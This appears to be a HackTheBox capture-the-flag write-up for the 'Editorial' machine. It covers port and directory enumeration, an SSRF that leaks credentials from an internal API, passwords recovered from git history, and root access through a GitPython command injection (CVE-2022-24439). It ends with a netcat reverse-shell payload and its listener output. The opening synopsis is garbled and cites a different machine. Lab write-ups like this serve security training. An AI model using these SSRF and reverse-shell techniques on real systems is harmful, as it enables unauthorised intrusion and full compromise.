---
layout: post
title: HackTheBox Editorial
date: 2024-01-06
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Editorial is a box. The obtained password is used to log into the box as the root user. ([Source](https://app.hackthebox.com/machines/Bizness/information))

# Enumeration

```bash
$ nmap -sV -sC 10.10.11.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-28 13:47 +08
Nmap scan report for 10.10.11.20
Host is up (0.0049s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Here is the website.

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Editorial/website.png?raw=true)

Discovered a hidden directory `/upload` with `dirsearch`.

```bash
$ dirsearch -u "http://editorial.htb/"
...
Target: http://editorial.htb/
[13:59:34] Starting: 
[13:59:41] 200 -    3KB - /about
[14:00:22] 200 -    7KB - /upload
```

![upload_webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Editorial/upload_webpage.png?raw=true)

# Exploitation

Tinkering around with the upload function did not yield any results. The uploaded file will be stored at `/static/uploads/<random_hex>` but when you try to open the link to the file, it will be downloaded directly on your browser instead of executing it.

However, there is an input box that allows you to put some arbitrary URL.

![burp_google](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Editorial/burp_google.png?raw=true)

When you change the URL to `127.0.0.1`, the HTTP response shows the default image file on the web server. 

![burp_localhost](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Editorial/burp_localhost.png?raw=true)

Tested the URL for SSRF vulnerability using Burp Intruder.

![burp_intruder](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Editorial/burp_intruder.png?raw=true)

The response showed that port 5000 is the odd one out.

![burp_intruder_result](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Editorial/burp_intruder_result.png?raw=true)

Check out what is this file located on the server using Burp. 

![burp_localhost_file](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Editorial/burp_localhost_file.png?raw=true)

There seems to be some hidden API endpoints that the localhost can reach.

![ssrf_authors_request](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Editorial/ssrf_authors_request.png?raw=true)

![ssrf_authors_response](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Editorial/ssrf_authors_response.png?raw=true)

There’s a credentials leaked on the authors API endpoint: `dev:dev080217_devAPI!@`.

```bash
$ ssh dev@editorial.htb
dev@editorial.htb's password: dev080217_devAPI!@
dev@editorial:~$ 
```

# Privilege Escalation

There is a `.git` folder located in the `apps` directory. Found a `logs` folder in the `.git` folder.

```bash
dev@editorial:~$ sudo -l
[sudo] password for dev: 
Sorry, user dev may not run sudo on editorial.
dev@editorial:~$ ls
apps  user.txt
dev@editorial:~$ cd apps/
dev@editorial:~/apps$ ls
dev@editorial:~/apps$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
dev@editorial:~/apps/.git$ ls
branches  COMMIT_EDITMSG  config  description  HEAD  hooks  index  info  logs  objects  refs
dev@editorial:~/apps/.git$ cat HEAD
ref: refs/heads/master
dev@editorial:~/apps/.git$ cd logs
dev@editorial:~/apps/.git/logs$ ls
HEAD  refs
dev@editorial:~/apps/.git/logs$ cat HEAD
0000000000000000000000000000000000000000 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905723 -0500	commit (initial): feat: create editorial app
3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 1e84a036b2f33c59e2390730699a488c65643d28 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905870 -0500	commit: feat: create api to editorial info
1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906108 -0500	commit: change(api): downgrading prod to dev
b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dfef9f20e57d730b7d71967582035925d57ad883 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906471 -0500	commit: change: remove debug and update api port
dfef9f20e57d730b7d71967582035925d57ad883 8ad0f3187e2bda88bba85074635ea942974587e8 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906661 -0500	commit: fix: bugfix in api port endpoint
```

There is an interesting git commit called `create api to editorial info`.

```bash
dev@editorial:~/apps/.git/logs$ git show 1e84a036b2f33c59e2390730699a488c65643d28
commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

diff --git a/app_api/app.py b/app_api/app.py
...
+
+# -- : (development) mail message to new authors
+@app.route(api_route + '/authors/message', methods=['GET'])
+def api_mail_new_authors():
+    return jsonify({
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+    }) # TODO: replace dev credentials when checks pass
+
+# -------------------------------
+# Start program
+# -------------------------------
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5001, debug=True)
```

Hidden in the git commit was the production credentials: `prod:080217_Producti0n_2023!@`.

```bash
$ ssh prod@editorial.htb
prod@editorial.htb's password: 080217_Producti0n_2023!@
prod@editorial:~$ sudo -l
[sudo] password for prod: 080217_Producti0n_2023!@
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

It appears that the production account has the privilege to run `clone_prod_change.py` as `root`.

```bash
prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Lets check what are the versions of the Python packages installed.

```bash
prod@editorial:~$ pip3 list
Package               Version
--------------------- ----------------
...
Flask                 2.2.2
gitdb                 4.0.10
GitPython             3.1.29
...
```

`GitPython 3.1.29` is vulnerable to `CVE-2022-24439` according to [Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858).

```bash
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c rm% /tmp/f;mkfifo% /tmp/f;cat% /tmp/f|/bin/bash% -i% 2>&1|nc% 10.10.14.5% 9999% >/tmp/f"
```

```bash
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.20] 46750
root@editorial:/opt/internal_apps/clone_changes# 
```
